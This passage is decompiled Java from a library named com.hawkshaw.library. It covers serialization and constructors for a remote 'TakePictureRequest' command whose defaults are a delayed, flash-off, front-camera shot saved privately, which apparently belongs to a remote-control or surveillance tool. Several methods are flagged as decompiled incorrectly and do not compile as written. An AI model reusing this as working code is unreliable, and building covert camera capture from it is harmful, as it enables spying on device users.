                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashType[] r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashType.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashType r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashType.OneShot     // Catch:{ NoSuchFieldError -> 0x0054 }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0054 }
                    r0[r4] = r1     // Catch:{ NoSuchFieldError -> 0x0054 }
                L_0x0054:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashType r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashType.Torch     // Catch:{ NoSuchFieldError -> 0x005c }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x005c }
                    r0[r4] = r2     // Catch:{ NoSuchFieldError -> 0x005c }
                L_0x005c:
                    $EnumSwitchMapping$2 = r0
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing[] r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing.Front     // Catch:{ NoSuchFieldError -> 0x006d }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x006d }
                    r0[r4] = r1     // Catch:{ NoSuchFieldError -> 0x006d }
                L_0x006d:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing.Back     // Catch:{ NoSuchFieldError -> 0x0075 }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0075 }
                    r0[r4] = r2     // Catch:{ NoSuchFieldError -> 0x0075 }
                L_0x0075:
                    $EnumSwitchMapping$3 = r0
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio[] r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio.RATIO_4_3     // Catch:{ NoSuchFieldError -> 0x0086 }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0086 }
                    r0[r4] = r1     // Catch:{ NoSuchFieldError -> 0x0086 }
                L_0x0086:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio.RATIO_16_9     // Catch:{ NoSuchFieldError -> 0x008e }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x008e }
                    r0[r4] = r2     // Catch:{ NoSuchFieldError -> 0x008e }
                L_0x008e:
                    $EnumSwitchMapping$4 = r0
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation[] r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.ROTATION_0     // Catch:{ NoSuchFieldError -> 0x009f }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x009f }
                    r0[r4] = r1     // Catch:{ NoSuchFieldError -> 0x009f }
                L_0x009f:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r1 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.ROTATION_90     // Catch:{ NoSuchFieldError -> 0x00a7 }
                    int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00a7 }
                    r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00a7 }
                L_0x00a7:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r1 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.ROTATION_180     // Catch:{ NoSuchFieldError -> 0x00af }
                    int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00af }
                    r0[r1] = r3     // Catch:{ NoSuchFieldError -> 0x00af }
                L_0x00af:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r1 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.ROTATION_270     // Catch:{ NoSuchFieldError -> 0x00b8 }
                    int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00b8 }
                    r2 = 4
                    r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00b8 }
                L_0x00b8:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r1 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.Auto     // Catch:{ NoSuchFieldError -> 0x00c1 }
                    int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00c1 }
                    r2 = 5
                    r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00c1 }
                L_0x00c1:
                    $EnumSwitchMapping$5 = r0
                    return
                
                throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.WhenMappings.<clinit>():void");
            }
        }

        public TakePictureRequest() {
            this(0, (Size) null, 0, false, (CaptureMode) null, (FlashMode) null, (FlashType) null, (LensFacing) null, (AspectRatio) null, (Rotation) null, 1023, (j3.f) null);
        }

        private static /* synthetic */ void getAspectRatio$annotations() {
        }

        private static /* synthetic */ void getCaptureMode$annotations() {
        }

        private static /* synthetic */ void getFlashMode$annotations() {
        }

        private static /* synthetic */ void getFlashType$annotations() {
        }

        public static /* synthetic */ void getJpegQuality$annotations() {
        }

        private static /* synthetic */ void getLensFacing$annotations() {
        }

        private static /* synthetic */ void getRotation$annotations() {
        }

        public static /* synthetic */ void getSaveToPrivate$annotations() {
        }

        public static /* synthetic */ void getSize$annotations() {
        }

        public static /* synthetic */ void getTakePictureDelay$annotations() {
        }

        /* JADX WARNING: Code restructure failed: missing block: B:107:0x01d1, code lost:*/
            if (r0 != r1) goto L_0x01d3;
         
        /* JADX WARNING: Code restructure failed: missing block: B:61:0x011d, code lost:*/
            if (r0 != r1) goto L_0x011f;
         
        /* JADX WARNING: Code restructure failed: missing block: B:74:0x014d, code lost:*/
            if (r0 != r1) goto L_0x014f;
         
        /* JADX WARNING: Code restructure failed: missing block: B:85:0x0179, code lost:*/
            if (r0 != r1) goto L_0x017b;
         
        /* JADX WARNING: Code restructure failed: missing block: B:96:0x01a5, code lost:*/
            if (r0 != r1) goto L_0x01a7;
         
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public static final /* synthetic */ void write$Self$library_release(com.hawkshaw.library.datalayer.models.Command.TakePictureRequest r11, D3.b r12, kotlinx.serialization.descriptors.SerialDescriptor r13) {
            
                kotlinx.serialization.KSerializer[] r0 = $childSerializers
                boolean r1 = r12.q(r13)
                r2 = 0
                if (r1 == 0) goto L_0x000a
                goto L_0x0010
            L_0x000a:
                int r1 = r11.jpegQuality
                r3 = 95
                if (r1 == r3) goto L_0x0018
            L_0x0010:
                int r1 = r11.jpegQuality
                r3 = r12
                p3.q r3 = (p3.q) r3
                r3.c0(r2, r1, r13)
            L_0x0018:
                boolean r1 = r12.q(r13)
                r3 = 1
                if (r1 == 0) goto L_0x0020
                goto L_0x0031
            L_0x0020:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r1 = r11.size
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r4 = new com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size
                r5 = 1200(0x4b0, float:1.682E-42)
                r6 = 1600(0x640, float:2.242E-42)
                r4.<init>(r5, r6)
                boolean r1 = Y1.K.f(r1, r4)
                if (r1 != 0) goto L_0x003b
            L_0x0031:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size$$serializer r1 = com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size$$serializer.INSTANCE
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r4 = r11.size
                r5 = r12
                p3.q r5 = (p3.q) r5
                r5.e0(r13, r3, r1, r4)
            L_0x003b:
                boolean r1 = r12.q(r13)
                r4 = 2
                if (r1 == 0) goto L_0x0043
                goto L_0x004b
            L_0x0043:
                long r5 = r11.takePictureDelay
                r7 = 2000(0x7d0, double:9.88E-321)
                int r1 = (r5 > r7 ? 1 : (r5 == r7 ? 0 : -1))
                if (r1 == 0) goto L_0x0053
            L_0x004b:
                long r5 = r11.takePictureDelay
                r1 = r12
                p3.q r1 = (p3.q) r1
                r1.d0(r13, r4, r5)
            L_0x0053:
                boolean r1 = r12.q(r13)
                r5 = 3
                if (r1 == 0) goto L_0x005b
                goto L_0x005f
            L_0x005b:
                boolean r1 = r11.saveToPrivate
                if (r1 == r3) goto L_0x0067
            L_0x005f:
                boolean r1 = r11.saveToPrivate
                r6 = r12
                p3.q r6 = (p3.q) r6
                r6.X(r13, r5, r1)
            L_0x0067:
                boolean r1 = r12.q(r13)
                r6 = 4
                if (r1 == 0) goto L_0x006f
                goto L_0x0075
            L_0x006f:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$CaptureMode r1 = r11.captureMode
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$CaptureMode r7 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.CaptureMode.MinimizeLatency
                if (r1 == r7) goto L_0x007f
            L_0x0075:
                r1 = r0[r6]
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$CaptureMode r7 = r11.captureMode
                r8 = r12
                p3.q r8 = (p3.q) r8
                r8.e0(r13, r6, r1, r7)
            L_0x007f:
                boolean r1 = r12.q(r13)
                r7 = 5
                if (r1 == 0) goto L_0x0087
                goto L_0x008d
            L_0x0087:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r1 = r11.flashMode
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.Off
                if (r1 == r8) goto L_0x0097
            L_0x008d:
                r1 = r0[r7]
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r8 = r11.flashMode
                r9 = r12
                p3.q r9 = (p3.q) r9
                r9.e0(r13, r7, r1, r8)
            L_0x0097:
                boolean r1 = r12.q(r13)
                if (r1 == 0) goto L_0x009e
                goto L_0x00a4
            L_0x009e:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashType r1 = r11.flashType
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashType r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashType.OneShot
                if (r1 == r8) goto L_0x00af
            L_0x00a4:
                r1 = 6
                r8 = r0[r1]
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashType r9 = r11.flashType
                r10 = r12
                p3.q r10 = (p3.q) r10
                r10.e0(r13, r1, r8, r9)
            L_0x00af:
                boolean r1 = r12.q(r13)
                if (r1 == 0) goto L_0x00b6
                goto L_0x00bc
            L_0x00b6:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r1 = r11.lensFacing
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing.Front
                if (r1 == r8) goto L_0x00c7
            L_0x00bc:
                r1 = 7
                r8 = r0[r1]
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r9 = r11.lensFacing
                r10 = r12
                p3.q r10 = (p3.q) r10
                r10.e0(r13, r1, r8, r9)
            L_0x00c7:
                boolean r1 = r12.q(r13)
                if (r1 == 0) goto L_0x00ce
                goto L_0x00d4
            L_0x00ce:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r1 = r11.aspectRatio
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio.RATIO_4_3
                if (r1 == r8) goto L_0x00e0
            L_0x00d4:
                r1 = 8
                r8 = r0[r1]
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r9 = r11.aspectRatio
                r10 = r12
                p3.q r10 = (p3.q) r10
                r10.e0(r13, r1, r8, r9)
            L_0x00e0:
                boolean r1 = r12.q(r13)
                if (r1 == 0) goto L_0x00e7
                goto L_0x00ed
            L_0x00e7:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r1 = r11.rotation
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.Auto
                if (r1 == r8) goto L_0x00f9
            L_0x00ed:
                r1 = 9
                r0 = r0[r1]
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r8 = r11.rotation
                r9 = r12
                p3.q r9 = (p3.q) r9
                r9.e0(r13, r1, r0, r8)
            L_0x00f9:
                boolean r0 = r12.q(r13)
                if (r0 == 0) goto L_0x0100
                goto L_0x011f
            L_0x0100:
                int r0 = r11.mCaptureMode
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$CaptureMode r1 = r11.captureMode
                int[] r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.WhenMappings.$EnumSwitchMapping$0
                int r1 = r1.ordinal()
                r1 = r8[r1]
                if (r1 == r3) goto L_0x011c
                if (r1 == r4) goto L_0x011a
                if (r1 != r5) goto L_0x0114
                r1 = r4
                goto L_0x011d
            L_0x0114:
                W2.x r11 = new W2.x
                r11.<init>()
                throw r11
            L_0x011a:
                r1 = r3
                goto L_0x011d
            L_0x011c:
                r1 = r2
            L_0x011d:
                if (r0 == r1) goto L_0x0129
            L_0x011f:
                int r0 = r11.mCaptureMode
                r1 = r12
                p3.q r1 = (p3.q) r1
                r8 = 10
                r1.c0(r8, r0, r13)
            L_0x0129:
                boolean r0 = r12.q(r13)
                if (r0 == 0) goto L_0x0130
                goto L_0x014f
            L_0x0130:
                int r0 = r11.mFlashMode
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r1 = r11.flashMode
                int[] r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.WhenMappings.$EnumSwitchMapping$1
                int r1 = r1.ordinal()
                r1 = r8[r1]
                if (r1 == r3) goto L_0x014c
                if (r1 == r4) goto L_0x014a
                if (r1 != r5) goto L_0x0144
                r1 = r4
                goto L_0x014d
            L_0x0144:
                W2.x r11 = new W2.x
                r11.<init>()
                throw r11
            L_0x014a:
                r1 = r3
                goto L_0x014d
            L_0x014c:
                r1 = r2
            L_0x014d:
                if (r0 == r1) goto L_0x0159
            L_0x014f:
                int r0 = r11.mFlashMode
                r1 = r12
                p3.q r1 = (p3.q) r1
                r8 = 11
                r1.c0(r8, r0, r13)
            L_0x0159:
                boolean r0 = r12.q(r13)
                if (r0 == 0) goto L_0x0160
                goto L_0x017b
            L_0x0160:
                int r0 = r11.mFlashType
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashType r1 = r11.flashType
                int[] r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.WhenMappings.$EnumSwitchMapping$2
                int r1 = r1.ordinal()
                r1 = r8[r1]
                if (r1 == r3) goto L_0x0178
                if (r1 != r4) goto L_0x0172
                r1 = r3
                goto L_0x0179
            L_0x0172:
                W2.x r11 = new W2.x
                r11.<init>()
                throw r11
            L_0x0178:
                r1 = r2
            L_0x0179:
                if (r0 == r1) goto L_0x0185
            L_0x017b:
                int r0 = r11.mFlashType
                r1 = r12
                p3.q r1 = (p3.q) r1
                r8 = 12
                r1.c0(r8, r0, r13)
            L_0x0185:
                boolean r0 = r12.q(r13)
                if (r0 == 0) goto L_0x018c
                goto L_0x01a7
            L_0x018c:
                int r0 = r11.mLensFacing
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r1 = r11.lensFacing
                int[] r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.WhenMappings.$EnumSwitchMapping$3
                int r1 = r1.ordinal()
                r1 = r8[r1]
                if (r1 == r3) goto L_0x01a4
                if (r1 != r4) goto L_0x019e
                r1 = r3
                goto L_0x01a5
            L_0x019e:
                W2.x r11 = new W2.x
                r11.<init>()
                throw r11
            L_0x01a4:
                r1 = r2
            L_0x01a5:
                if (r0 == r1) goto L_0x01b1
            L_0x01a7:
                int r0 = r11.mLensFacing
                r1 = r12
                p3.q r1 = (p3.q) r1
                r8 = 13
                r1.c0(r8, r0, r13)
            L_0x01b1:
                boolean r0 = r12.q(r13)
                if (r0 == 0) goto L_0x01b8
                goto L_0x01d3
            L_0x01b8:
                int r0 = r11.mAspectRatio
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r1 = r11.aspectRatio
                int[] r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.WhenMappings.$EnumSwitchMapping$4
                int r1 = r1.ordinal()
                r1 = r8[r1]
                if (r1 == r3) goto L_0x01d0
                if (r1 != r4) goto L_0x01ca
                r1 = r3
                goto L_0x01d1
            L_0x01ca:
                W2.x r11 = new W2.x
                r11.<init>()
                throw r11
            L_0x01d0:
                r1 = r2
            L_0x01d1:
                if (r0 == r1) goto L_0x01dd
            L_0x01d3:
                int r0 = r11.mAspectRatio
                r1 = r12
                p3.q r1 = (p3.q) r1
                r8 = 14
                r1.c0(r8, r0, r13)
            L_0x01dd:
                boolean r0 = r12.q(r13)
                if (r0 == 0) goto L_0x01e4
                goto L_0x021b
            L_0x01e4:
                java.lang.Integer r0 = r11.mRotation
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r1 = r11.rotation
                int[] r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.WhenMappings.$EnumSwitchMapping$5
                int r1 = r1.ordinal()
                r1 = r8[r1]
                if (r1 == r3) goto L_0x0211
                if (r1 == r4) goto L_0x020c
                if (r1 == r5) goto L_0x0207
                if (r1 == r6) goto L_0x0202
                if (r1 != r7) goto L_0x01fc
                r1 = 0
                goto L_0x0215
            L_0x01fc:
                W2.x r11 = new W2.x
                r11.<init>()
                throw r11
            L_0x0202:
                java.lang.Integer r1 = java.lang.Integer.valueOf(r5)
                goto L_0x0215
            L_0x0207:
                java.lang.Integer r1 = java.lang.Integer.valueOf(r4)
                goto L_0x0215
            L_0x020c:
                java.lang.Integer r1 = java.lang.Integer.valueOf(r3)
                goto L_0x0215
            L_0x0211:
                java.lang.Integer r1 = java.lang.Integer.valueOf(r2)
            L_0x0215:
                boolean r0 = Y1.K.f(r0, r1)
                if (r0 != 0) goto L_0x0224
            L_0x021b:
                E3.O r0 = E3.O.f456a
                java.lang.Integer r11 = r11.mRotation
                r1 = 15
                r12.s(r13, r1, r0, r11)
            L_0x0224:
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.write$Self$library_release(com.hawkshaw.library.datalayer.models.Command$TakePictureRequest, D3.b, kotlinx.serialization.descriptors.SerialDescriptor):void");
        }

        public final int getJpegQuality() {
            return this.jpegQuality;
        }

        public final int getMAspectRatio() {
            return this.mAspectRatio;
        }

        public final int getMCaptureMode() {
            return this.mCaptureMode;
        }

        public final int getMFlashMode() {
            return this.mFlashMode;
        }

        public final int getMFlashType() {
            return this.mFlashType;
        }

        public final int getMLensFacing() {
            return this.mLensFacing;
        }

        public final Integer getMRotation() {
            return this.mRotation;
        }

        public final boolean getSaveToPrivate() {
            return this.saveToPrivate;
        }

        public final Size getSize() {
            return this.size;
        }

        public final long getTakePictureDelay() {
            return this.takePictureDelay;
        }

        @f
        public static final class Size {
            public static final Companion Companion = new Companion((j3.f) null);
            private final int height;
            private final int width;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                public final KSerializer serializer() {
                    return Command$TakePictureRequest$Size$$serializer.INSTANCE;
                }
            }

            public /* synthetic */ Size(int i5, int i6, int i7, q0 q0Var) {
                if (3 == (i5 & 3)) {
                    this.width = i6;
                    this.height = i7;
                    return;
                }
                w.x(i5, 3, Command$TakePictureRequest$Size$$serializer.INSTANCE.getDescriptor());
                throw null;
            }

            public static /* synthetic */ void getHeight$annotations() {
            }

            public static /* synthetic */ void getWidth$annotations() {
            }

            public static final /* synthetic */ void write$Self$library_release(Size size, b bVar, SerialDescriptor serialDescriptor) {
                q qVar = (q) bVar;
                qVar.c0(0, size.width, serialDescriptor);
                qVar.c0(1, size.height, serialDescriptor);
            }

            public final int getHeight() {
                return this.height;
            }

            public final int getWidth() {
                return this.width;
            }

            public Size(int i5, int i6) {
                this.width = i5;
                this.height = i6;
            }
        }

        public /* synthetic */ TakePictureRequest(int i5, int i6, Size size2, long j5, boolean z4, CaptureMode captureMode2, FlashMode flashMode2, FlashType flashType2, LensFacing lensFacing2, AspectRatio aspectRatio2, Rotation rotation2, int i7, int i8, int i9, int i10, int i11, Integer num, q0 q0Var) {
            Size size3;
            CaptureMode captureMode3;
            FlashMode flashMode3;
            FlashType flashType3;
            LensFacing lensFacing3;
            AspectRatio aspectRatio3;
            Rotation rotation3;
            int i12;
            int i13;
            int i14;
            int i15;
            int i16;
            int i17;
            int i18 = i5;
            this.jpegQuality = (i18 & 1) == 0 ? 95 : i6;
            if ((i18 & 2) == 0) {
                size3 = new Size(1200, 1600);
            } else {
                size3 = size2;
            }
            this.size = size3;
            this.takePictureDelay = (i18 & 4) == 0 ? 2000 : j5;
            if ((i18 & 8) == 0) {
                this.saveToPrivate = true;
            } else {
                this.saveToPrivate = z4;
            }
            if ((i18 & 16) == 0) {
                captureMode3 = CaptureMode.MinimizeLatency;
            } else {
                captureMode3 = captureMode2;
            }
            this.captureMode = captureMode3;
            if ((i18 & 32) == 0) {
                flashMode3 = FlashMode.Off;
            } else {
                flashMode3 = flashMode2;
            }
            this.flashMode = flashMode3;
            if ((i18 & 64) == 0) {
                flashType3 = FlashType.OneShot;
            } else {
                flashType3 = flashType2;
            }
            this.flashType = flashType3;
            if ((i18 & 128) == 0) {
                lensFacing3 = LensFacing.Front;
            } else {
                lensFacing3 = lensFacing2;
            }
            this.lensFacing = lensFacing3;
            if ((i18 & 256) == 0) {
                aspectRatio3 = AspectRatio.RATIO_4_3;
            } else {
                aspectRatio3 = aspectRatio2;
            }
            this.aspectRatio = aspectRatio3;
            if ((i18 & NotificationCompat.FLAG_GROUP_SUMMARY) == 0) {
                rotation3 = Rotation.Auto;
            } else {
                rotation3 = rotation2;
            }
            this.rotation = rotation3;
            if ((i18 & 1024) == 0) {
                int i19 = WhenMappings.$EnumSwitchMapping$0[this.captureMode.ordinal()];
                if (i19 == 1) {
                    i12 = 0;
                } else if (i19 == 2) {
                    i12 = 1;
                } else if (i19 == 3) {
                    i12 = 2;
                } else {
                    throw new RuntimeException();
                }
            } else {
                i12 = i7;
            }
            this.mCaptureMode = i12;
            if ((i18 & 2048) == 0) {
                int i20 = WhenMappings.$EnumSwitchMapping$1[this.flashMode.ordinal()];
                if (i20 == 1) {
                    i13 = 0;
                } else if (i20 == 2) {
                    i13 = 1;
                } else if (i20 == 3) {
                    i13 = 2;
                } else {
                    throw new RuntimeException();
                }
            } else {
                i13 = i8;
            }
            this.mFlashMode = i13;
            if ((i18 & NotificationCompat.FLAG_BUBBLE) == 0) {
                int i21 = WhenMappings.$EnumSwitchMapping$2[this.flashType.ordinal()];
                if (i21 == 1) {
                    i14 = 0;
                } else if (i21 == 2) {
                    i14 = 1;
                } else {
                    throw new RuntimeException();
                }
            } else {
                i14 = i9;
            }
            this.mFlashType = i14;
            if ((i18 & 8192) == 0) {
                int i22 = WhenMappings.$EnumSwitchMapping$3[this.lensFacing.ordinal()];
                if (i22 == 1) {
                    i15 = 0;
                } else if (i22 == 2) {
                    i15 = 1;
                } else {
                    throw new RuntimeException();
                }
            } else {
                i15 = i10;
            }
            this.mLensFacing = i15;
            if ((i18 & 16384) == 0) {
                int i23 = WhenMappings.$EnumSwitchMapping$4[this.aspectRatio.ordinal()];
                if (i23 == 1) {
                    i16 = 0;
                } else if (i23 == 2) {
                    i16 = 1;
                } else {
                    throw new RuntimeException();
                }
            } else {
                i16 = i11;
            }
            this.mAspectRatio = i16;
            if ((i18 & 32768) == 0) {
                int i24 = WhenMappings.$EnumSwitchMapping$5[this.rotation.ordinal()];
                if (i24 == 1) {
                    i17 = 0;
                } else if (i24 == 2) {
                    i17 = 1;
                } else if (i24 == 3) {
                    i17 = 2;
                } else if (i24 == 4) {
                    i17 = 3;
                } else if (i24 == 5) {
                    i17 = null;
                } else {
                    throw new RuntimeException();
                }
            } else {
                i17 = num;
            }
            this.mRotation = i17;
        }

        /* JADX WARNING: Illegal instructions before constructor call */
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public /* synthetic */ TakePictureRequest(int r12, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Size r13, long r14, boolean r16, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.CaptureMode r17, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode r18, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashType r19, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing r20, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio r21, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation r22, int r23, j3.f r24) {
            
                r11 = this;
                r0 = r23
                r1 = r0 & 1
                if (r1 == 0) goto L_0x0009
                r1 = 95
                goto L_0x000a
            L_0x0009:
                r1 = r12
            L_0x000a:
                r2 = r0 & 2
                if (r2 == 0) goto L_0x0018
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r2 = new com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size
                r3 = 1200(0x4b0, float:1.682E-42)
                r4 = 1600(0x640, float:2.242E-42)
                r2.<init>(r3, r4)
                goto L_0x0019
            L_0x0018:
                r2 = r13
            L_0x0019:
                r3 = r0 & 4
                if (r3 == 0) goto L_0x0020
                r3 = 2000(0x7d0, double:9.88E-321)
                goto L_0x0021
            L_0x0020:
                r3 = r14
            L_0x0021:
                r5 = r0 & 8
                if (r5 == 0) goto L_0x0027
                r5 = 1
                goto L_0x0029
            L_0x0027:
                r5 = r16
            L_0x0029:
                r6 = r0 & 16
                if (r6 == 0) goto L_0x0030
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$CaptureMode r6 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.CaptureMode.MinimizeLatency
                goto L_0x0032
            L_0x0030:
                r6 = r17
            L_0x0032:
                r7 = r0 & 32
                if (r7 == 0) goto L_0x0039
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r7 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.Off
                goto L_0x003b
            L_0x0039:
                r7 = r18
            L_0x003b:
                r8 = r0 & 64
                if (r8 == 0) goto L_0x0042
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashType r8 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashType.OneShot
                goto L_0x0044
            L_0x0042:
                r8 = r19
            L_0x0044:
                r9 = r0 & 128(0x80, float:1.8E-43)
                if (r9 == 0) goto L_0x004b
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r9 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing.Front
                goto L_0x004d
            L_0x004b:
                r9 = r20
            L_0x004d:
                r10 = r0 & 256(0x100, float:3.59E-43)
                if (r10 == 0) goto L_0x0054
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r10 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio.RATIO_4_3
                goto L_0x0056
            L_0x0054:
                r10 = r21
            L_0x0056:
                r0 = r0 & 512(0x200, float:7.17E-43)
                if (r0 == 0) goto L_0x005d
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.Auto
                goto L_0x005f
            L_0x005d:
                r0 = r22
            L_0x005f:
                r12 = r11
                r13 = r1
                r14 = r2
                r15 = r3
                r17 = r5
                r18 = r6
                r19 = r7
                r20 = r8
                r21 = r9
                r22 = r10
                r23 = r0
                r12.<init>(r13, r14, r15, r17, r18, r19, r20, r21, r22, r23)
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.<init>(int, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size, long, boolean, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$CaptureMode, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashType, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation, int, j3.f):void");
        }

        public TakePictureRequest(int i5, Size size2, long j5, boolean z4, CaptureMode captureMode2, FlashMode flashMode2, FlashType flashType2, LensFacing lensFacing2, AspectRatio aspectRatio2, Rotation rotation2) {
            int i6;
            int i7;
            int i8;
            int i9;
